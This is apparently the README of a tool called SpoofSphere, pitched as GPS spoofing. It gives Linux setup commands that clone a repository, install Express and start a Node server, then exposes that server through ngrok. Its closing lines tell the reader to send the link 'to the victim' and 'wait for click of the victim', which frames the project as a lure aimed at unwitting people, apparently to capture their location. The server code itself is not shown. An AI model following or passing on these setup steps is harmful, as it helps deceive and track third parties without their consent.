# SpoofSphere
Bend reality with code—spoof GPS and rewrite your coordinates like a ghost.

Installation for Linux:

sudo apt update
sudo apt upgrade
git clone https://github.com/Error2k25/SpoofSphere.git
cd SpoofSphere
sudo apt install npm
npm init -y
npm install express
node server.js

Now forward the port to the victim (For port forwarding, I'm using ngrok)

Take a new Terminal && run this command:
ngrok http 3000

That's it. Now wait for click of the victim.